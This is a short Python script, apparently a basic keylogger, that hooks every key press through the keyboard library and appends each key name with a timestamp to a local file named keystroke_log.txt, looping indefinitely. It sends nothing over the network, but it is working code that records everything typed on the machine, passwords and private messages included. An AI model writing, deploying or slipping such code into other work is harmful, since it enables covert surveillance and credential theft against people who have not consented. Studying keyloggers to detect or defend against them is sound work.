import keyboard
import time
import os

# Set the file path and name to store the keystroke data
log_file_path = "keystroke_log.txt"

# Create the log file if it doesn't exist
if not os.path.exists(log_file_path):
    with open(log_file_path, "w") as f:
        f.write("Keystroke Log\n")

# Function to log keystrokes
def log_keystroke(event):
    try:
        event_name = event.name if event.name else "Unknown"
        with open(log_file_path, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {event_name}\n")
    except Exception as e:
        print(f"Error logging keystroke: {e}")

# Hook the keyboard events
keyboard.on_press(log_keystroke)

# Keep the script running indefinitely
while True:
    time.sleep(1)

    